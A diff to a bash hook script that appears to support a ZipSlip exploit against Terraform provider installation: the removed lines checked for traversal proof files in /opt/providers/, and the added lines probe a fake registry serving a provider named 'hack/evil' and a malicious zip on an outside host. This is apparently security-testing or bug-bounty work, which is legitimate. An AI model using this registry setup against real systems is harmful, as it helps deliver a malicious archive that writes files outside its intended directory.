@@ -1,32 +1,36 @@
 #!/usr/bin/env bash
-echo "=== P1 ZIPSLIP TRAVERSAL CHECK ==="
+echo "=== P1 ZIPSLIP NETWORK PROBE ==="
 echo "TIME=$(date +%H:%M:%S.%3N)"
 echo "HOOK_EVENT=$HOOK_EVENT"
-echo "PWD=$(pwd)"
 
-echo "--- check /opt/providers/ for traversal marker ---"
-if [ -f "/opt/providers/zipslip_CONFIRMED.txt" ]; then
-  echo "ZIPSLIP CONFIRMED: /opt/providers/zipslip_CONFIRMED.txt EXISTS"
-  cat /opt/providers/zipslip_CONFIRMED.txt
-else
-  echo "NOT FOUND: /opt/providers/zipslip_CONFIRMED.txt"
-fi
+echo "--- DNS resolution for registry ---"
+python3 -c "import socket; print(socket.gethostbyname('v-vlasenko.github.io'))" 2>&1
 
-echo "--- check workdir for traversal marker ---"
-if [ -f "zipslip_proof.txt" ]; then
-  echo "WORKDIR TRAVERSAL: zipslip_proof.txt EXISTS in workdir"
-  cat zipslip_proof.txt
-else
-  echo "NOT FOUND: zipslip_proof.txt in workdir"
-fi
+echo "--- discovery endpoint ---"
+curl -sf --max-time 10 "https://v-vlasenko.github.io/.well-known/terraform.json" 2>&1 && echo "[OK]" || echo "[FAILED]"
 
-echo "--- list /opt/providers/ ---"
-ls -la /opt/providers/ 2>/dev/null | head -20 || echo "cannot list /opt/providers/"
+echo "--- versions endpoint ---"
+curl -sf --max-time 10 "https://v-vlasenko.github.io/v1/providers/hack/evil/versions" 2>&1 && echo "[OK]" || echo "[FAILED]"
 
-echo "--- list /opt/providers-downloads/ ---"
-ls -la /opt/providers-downloads/ 2>/dev/null | head -10 || echo "cannot list /opt/providers-downloads/"
+echo "--- download metadata ---"
+curl -sf --max-time 10 "https://v-vlasenko.github.io/v1/providers/hack/evil/0.0.1/download/linux/amd64" 2>&1 && echo "[OK]" || echo "[FAILED]"
 
-echo "--- find all zipslip files ---"
-find /opt/ -name "zipslip*" 2>/dev/null
+echo "--- zip download test (head only) ---"
+curl -sI --max-time 15 "https://raw.githubusercontent.com/v-vlasenko/base/master/fake-registry/evil-0.0.1.zip" 2>&1 | head -5
+
+echo "--- CA bundle in use ---"
+python3 -c "import certifi; print(certifi.where())" 2>/dev/null || echo "no certifi"
+echo "REQUESTS_CA_BUNDLE=$REQUESTS_CA_BUNDLE"
+echo "SSL_CERT_FILE=$SSL_CERT_FILE"
+
+echo "--- python requests test to registry ---"
+python3 -c "
+import requests
+try:
+    r = requests.get('https://v-vlasenko.github.io/.well-known/terraform.json', timeout=10)
+    print('requests OK:', r.status_code, r.text[:100])
+except Exception as e:
+    print('requests FAILED:', e)
+" 2>&1
 
 echo "=== DONE ==="
